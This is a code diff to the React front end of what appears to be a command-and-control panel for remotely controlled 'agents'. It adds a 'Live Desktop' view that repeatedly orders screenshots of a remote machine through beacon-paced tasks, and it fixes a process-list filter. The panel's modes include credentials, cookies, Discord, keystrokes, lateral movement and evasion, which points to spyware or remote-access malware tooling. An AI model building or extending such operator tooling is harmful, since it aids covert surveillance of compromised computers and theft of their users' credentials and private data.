@@ -49,12 +49,121 @@ import {
   Server,
   Wifi,
   WifiOff,
+  Monitor,
+  Lock,
 } from "lucide-react"
 import { formatDistanceToNow } from 'date-fns'
+import { motion } from 'framer-motion'
+import { api } from '@/services/api'
 
 interface AgentDetailContentProps {
   agentId: string
-  mode: 'shell' | 'screenshot' | 'files' | 'processes' | 'lateral' | 'evasion' | 'modules' | 'credentials' | 'cookies' | 'discord' | 'keystrokes'
+  mode: 'shell' | 'desktop' | 'screenshot' | 'files' | 'processes' | 'lateral' | 'evasion' | 'modules' | 'credentials' | 'cookies' | 'discord' | 'keystrokes'
+}
+
+/* ── Live Desktop: queues a screenshot task per tick, polls /api/tasks/:id,
+   renders the returned base64 JPEG. Agent beacons are slow (sleep+jitter),
+   so the cadence follows the agent's beacon window. ── */
+function DesktopView({ agentId }: { agentId: string }) {
+  const [img, setImg] = React.useState<string | null>(null)
+  const [status, setStatus] = React.useState<'idle' | 'capturing' | 'waiting' | 'error'>('idle')
+  const [error, setError] = React.useState<string>('')
+  const [intervalS, setIntervalS] = React.useState(20)
+  const [lastFrame, setLastFrame] = React.useState<string>('')
+  const running = React.useRef(true)
+  const imgRef = React.useRef<HTMLImageElement | null>(null)
+
+  const captureOnce = React.useCallback(async () => {
+    setStatus('capturing')
+    try {
+      const task: any = await api.takeScreenshot(agentId)
+      const taskId = task?.id ?? task?.ID
+      if (!taskId) throw new Error('no task id')
+      setStatus('waiting')
+      const deadline = Date.now() + Math.max(60, intervalS * 4) * 1000
+      while (running.current && Date.now() < deadline) {
+        await new Promise(r => setTimeout(r, 2500))
+        const t: any = await api.getTask(taskId)
+        const st = String(t?.status ?? t?.Status ?? '')
+        const out: string = String(t?.result ?? t?.Output ?? '')
+        if (st === 'completed' && out && out.length > 512) {
+          setImg(`data:image/jpeg;base64,${out.replace(/\s/g, '')}`)
+          setLastFrame(new Date().toLocaleTimeString())
+          setStatus('idle')
+          return
+        }
+        if (st === 'failed') throw new Error(t?.error || 'agent returned failure')
+      }
+      setStatus('idle')
+    } catch (e: any) {
+      setError(e?.message || 'capture failed')
+      setStatus('error')
+    }
+  }, [agentId, intervalS])
+
+  React.useEffect(() => {
+    running.current = true
+    captureOnce()
+    const iv = setInterval(() => { if (running.current) captureOnce() }, intervalS * 1000)
+    return () => { running.current = false; clearInterval(iv) }
+  }, [captureOnce, intervalS])
+
+  const zoom = () => { if (imgRef.current) imgRef.current.requestFullscreen?.() }
+
+  return (
+    <div className="h-full flex flex-col">
+      <div className="flex items-center justify-between mb-4 gap-2 flex-wrap">
+        <CardTitle className="flex items-center gap-2">
+          <Monitor className="w-5 h-5 text-accent-400" />
+          Live Desktop
+        </CardTitle>
+        <div className="flex items-center gap-2">
+          <select
+            value={intervalS}
+            onChange={(e) => setIntervalS(Number(e.target.value))}
+            className="bg-dark-900 border border-dark-700 rounded-lg px-2 py-1 text-sm text-dark-200"
+          >
+            <option value={10}>Every 10s</option>
+            <option value={20}>Every 20s</option>
+            <option value={60}>Every 60s</option>
+            <option value={300}>Every 5m</option>
+          </select>
+          <Button variant="outline" size="sm" onClick={captureOnce} disabled={status !== 'idle'}>
+            {status === 'capturing' || status === 'waiting' ? <Loader2 className="w-4 h-4 animate-spin" /> : <Camera className="w-4 h-4 mr-2" />}
+            Capture now
+          </Button>
+          {img && (
+            <Button variant="ghost" size="sm" onClick={() => {
+              const a = document.createElement('a')
+              a.href = img; a.download = `desktop-${Date.now()}.jpg`; a.click()
+            }}>
+              <Download className="w-4 h-4 mr-2" /> Save
+            </Button>
+          )}
+        </div>
+      </div>
+      <div className="flex-1 rounded-xl border border-dark-700 bg-dark-950/80 overflow-hidden relative flex items-center justify-center min-h-[420px]">
+        {img ? (
+          <>
+            <img ref={imgRef} src={img} alt="agent desktop" onClick={zoom} className="max-w-full max-h-full object-contain cursor-zoom-in" />
+            <div className="absolute bottom-3 left-3 flex items-center gap-2 px-3 py-1.5 rounded-full bg-dark-950/90 border border-dark-700 text-xs">
+              <span className={cn("w-2 h-2 rounded-full", status === 'idle' ? 'bg-green-400 animate-pulse' : 'bg-yellow-400 animate-pulse')} />
+              <span className="text-dark-300 font-mono">{status === 'idle' ? 'streaming' : status}</span>
+              {lastFrame && <span className="text-dark-500 font-mono">last frame {lastFrame}</span>}
+            </div>
+          </>
+        ) : (
+          <div className="text-center text-dark-500 p-8">
+            {status === 'error' ? (
+              <><AlertTriangle className="w-10 h-10 mx-auto mb-3 text-red-400" /><p className="text-sm">{error}</p><p className="text-xs mt-2">The agent must beacon before it picks up the capture task — try a longer interval.</p></>
+            ) : (
+              <><Loader2 className="w-10 h-10 mx-auto mb-3 animate-spin text-accent-400" /><p className="text-sm">Waiting for agent to beacon and capture…</p></>
+            )}
+          </div>
+        )}
+      </div>
+    </div>
+  )
 }
 
 export function AgentDetailContent({ agentId, mode }: AgentDetailContentProps) {
@@ -385,7 +494,13 @@ export function AgentDetailContent({ agentId, mode }: AgentDetailContentProps) {
     </div>
   )
 
-  const renderProcesses = () => (
+  const renderProcesses = () => {
+    const filteredProcesses = processes.filter(p =>
+      p.Name.toLowerCase().includes(searchTerm.toLowerCase()) ||
+      p.PID.toString().includes(searchTerm) ||
+      p.User.toLowerCase().includes(searchTerm.toLowerCase())
+    )
+    return (
     <div className="h-full flex flex-col">
       <div className="flex items-center justify-between mb-4">
         <CardTitle className="flex items-center gap-2">
@@ -404,12 +519,6 @@ export function AgentDetailContent({ agentId, mode }: AgentDetailContentProps) {
           </Button>
         </div>
       </div>
-
-      const filteredProcesses = processes.filter(p => 
-        p.Name.toLowerCase().includes(searchTerm.toLowerCase()) ||
-        p.PID.toString().includes(searchTerm) ||
-        p.User.toLowerCase().includes(searchTerm.toLowerCase())
-      )
 
       {filteredProcesses.length === 0 ? (
         <div className="flex-1 flex items-center justify-center">
@@ -474,7 +583,8 @@ export function AgentDetailContent({ agentId, mode }: AgentDetailContentProps) {
         </ScrollArea>
       )}
     </div>
-  )
+    )
+  }
 
   const renderPlaceholder = (title: string, icon: React.ReactNode, description: string) => (
     <div className="h-full flex items-center justify-center">
@@ -494,6 +604,8 @@ export function AgentDetailContent({ agentId, mode }: AgentDetailContentProps) {
     switch (mode) {
       case 'shell':
         return renderShell()
+      case 'desktop':
+        return <DesktopView agentId={agentId} />
       case 'screenshot':
         return renderScreenshots()
       case 'files':
